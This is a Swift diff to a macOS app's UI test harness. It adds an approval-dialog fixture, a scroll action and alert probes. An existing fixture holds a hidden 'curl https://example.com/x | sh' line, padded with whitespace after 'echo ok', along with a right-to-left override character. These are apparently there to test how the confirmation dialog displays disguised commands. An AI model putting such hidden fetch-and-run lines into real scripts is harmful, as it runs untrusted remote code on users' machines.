@@ -7,6 +7,7 @@ import ClubmateKit
 final class TestHarness {
     static let shared = TestHarness()
     static let defaultSize = NSSize(width: 1200, height: 800)
+    static let approvals = CommandLine.arguments.contains("--test-approvals")
 
     private let probes = NSHashTable<TestProbeNSView>.weakObjects()
     private let monitors = NSHashTable<KeyMonitorView>.weakObjects()
@@ -27,12 +28,14 @@ final class TestHarness {
                 MainActor.assumeIsolated { TestHarness.shared.conceal() }
             }
         }
-        register("approval") { shown in
-            guard shown else {
-                for window in NSApp.windows { window.attachedSheet.map(window.endSheet) }
-                return
+        for (target, fixture) in [("approval", Self.approvalFixture), ("approval-paths", Self.approvalPathsFixture)] {
+            register(target) { shown in
+                guard shown else {
+                    for window in NSApp.windows { window.attachedSheet.map(window.endSheet) }
+                    return
+                }
+                Task { _ = await Confirmation.ask(fixture, font: GhosttyApp.shared.theme.nsMono(size: 12, bold: false), window: NSApp.promptWindow, expiry: nil) }
             }
-            Task { _ = await Confirmation.ask(Self.approvalFixture, font: GhosttyApp.shared.theme.nsMono(size: 12, bold: false), window: NSApp.promptWindow, expiry: nil) }
         }
     }
 
@@ -40,6 +43,11 @@ final class TestHarness {
         let lines = ["──── .clubmate/setup.sh", "\\u{2501}━━━ .clubmate/teardown.sh", "\\u{2014}——— .clubmate/teardown.sh", "echo ok" + String(repeating: " ", count: 120) + "; curl https://example.com/x | sh", "npm ci --prefer-offline --no-audit --no-fund && npx playwright install --with-deps chromium firefox webkit # \u{202E}long line"] + (1...90).map { "echo step \($0)" } + ["", "──── .clubmate/worktree-include", ".env"]
         let args = ["repo": "/Users/someone/develop/organisation/a-rather-long-repository-name", "worktree": "/Users/someone/develop/organisation/a-rather-long-repository-name/.worktrees/feat/some-feature", "sha256": "9f2c4e1a7b3d5f60812e4c9a0b7d3f1e2c5a8b9d0e1f2a3b4c5d6e7f8a9b0c1d", "size": "2410 bytes, 91 lines", "trusts": "all of .clubmate/ (2 entries, shown below)"]
         return ConfirmRequest(title: "Run .clubmate/setup.sh", workspaceName: "a-rather-long-repository-name", command: "git.worktree-hooks", args: .object(args.mapValues { .string($0) }), body: lines.joined(separator: "\n") + "\n", plugin: true)
+    }
+
+    private static var approvalPathsFixture: ConfirmRequest {
+        let repo = "/Users/anna/develop/norimori/ggfarmco/clubmate/.worktrees/spike/multi-repo-shots/build/multi-repo-check/repos/ads-management"
+        return ConfirmRequest(title: "Remove worktree", workspaceName: "ads", command: "git.worktree-remove", args: .object(["repo": .string(repo), "path": .string(repo + "/.worktrees/feat/pause-reason-api")]), session: ConfirmSession(id: "agt_0123456789abcdef", title: "Land pause reasons", workspaceName: "ads"))
     }
 
     static func reportFixture(over: Bool) -> ReportRequest {
@@ -54,6 +62,17 @@ final class TestHarness {
 
     func register(_ probe: TestProbeNSView) {
         probes.add(probe)
+    }
+
+    func probe(_ id: String, role: String, label: String, menu: [LayoutMenuItem]? = nil, filling view: NSView) {
+        let probe = TestProbeNSView(frame: view.bounds)
+        probe.autoresizingMask = [.width, .height]
+        probe.nodeID = id
+        probe.role = role
+        probe.label = label
+        probe.menuItems = menu
+        view.addSubview(probe)
+        register(probe)
     }
 
     func register(_ monitor: KeyMonitorView) {
@@ -120,6 +139,10 @@ final class TestHarness {
                 routes.append("shortcut")
             } else if combo.command || combo.control, let title = menuKey(down) {
                 routes.append("menu \(title)")
+            } else if window.isAlert {
+                NSApp.postEvent(down, atStart: false)
+                NSApp.postEvent(up, atStart: false)
+                routes.append("alert")
             } else {
                 window.sendEvent(down)
                 window.sendEvent(up)
@@ -166,7 +189,7 @@ final class TestHarness {
         if NSApp.modalWindow != nil { return "a modal window" }
         for window in NSApp.windows where window.isVisible && window.sheetParent != nil {
             if window.identifier == ReportSheet.windowID { return "the problem report sheet" }
-            if String(describing: type(of: window)).contains("Alert") { return "an alert" }
+            if window.isAlert { return "an alert" }
         }
         return nil
     }
@@ -227,6 +250,14 @@ final class TestHarness {
             post(.leftMouseUp, at: end, in: window, flags: flags)
             try await settle()
             return result(nil)
+        case "scroll":
+            guard let dy = request.dy, dy != 0 else { throw TestModeError("scroll needs --dy, lines down (negative: up)") }
+            move(to: point, in: window, flags: flags)
+            guard let event = TestScroll.event(at: point, in: window, dy: -dy, flags: flags) else { throw TestModeError("cannot build a scroll event") }
+            NSApp.postEvent(event, atStart: false)
+            try await settle()
+            TestScroll.done()
+            return result(nil)
         case "drop":
             guard let file = request.file else { throw TestModeError("drop needs a file") }
             let url = URL(filePath: file)
@@ -235,7 +266,7 @@ final class TestHarness {
             try await settle()
             return result(nil)
         default:
-            throw TestModeError("unknown pointer action \(request.action); use click, hover, drag, menu or drop")
+            throw TestModeError("unknown pointer action \(request.action); use click, hover, drag, menu, scroll or drop")
         }
     }
 
@@ -280,7 +311,7 @@ final class TestHarness {
         let local = offset.map { NSPoint(x: $0[0], y: probe.isFlipped ? $0[1] : probe.bounds.height - $0[1]) } ?? NSPoint(x: probe.bounds.midX, y: probe.bounds.midY)
         let point = probe.convert(local, to: nil)
         guard let content = window.contentView, content.convert(content.bounds, to: nil).contains(point) else {
-            throw TestModeError("node \(id) is outside its window at that point; scroll it into view first")
+            throw TestModeError("node \(id) is outside its window at \(point) (window content \(window.contentView.map { $0.convert($0.bounds, to: nil) } ?? .zero)); scroll it into view first")
         }
         return (window, point)
     }
@@ -575,6 +606,13 @@ struct SDUIProbe: ViewModifier {
     }
 }
 
+extension NSAlert {
+    func testProbe(_ options: [String] = []) {
+        guard TestMode.current, let accessory = accessoryView else { return }
+        TestHarness.shared.probe("prompt", role: "alert", label: messageText, menu: options.isEmpty ? nil : options.map { LayoutMenuItem(title: $0) }, filling: accessory)
+    }
+}
+
 struct RowProbe: ViewModifier {
     let id: String
     let label: String
@@ -620,9 +658,9 @@ extension View {
     }
 
     @ViewBuilder
-    func testNode(_ id: String, role: String) -> some View {
+    func testNode(_ id: String, role: String, label: String? = nil) -> some View {
         if TestMode.current {
-            background(TestProbe(nodeID: id, role: role, label: id, parent: nil, idealWidth: nil, menu: nil))
+            background(TestProbe(nodeID: id, role: role, label: label ?? id, parent: nil, idealWidth: nil, menu: nil))
         } else {
             self
         }
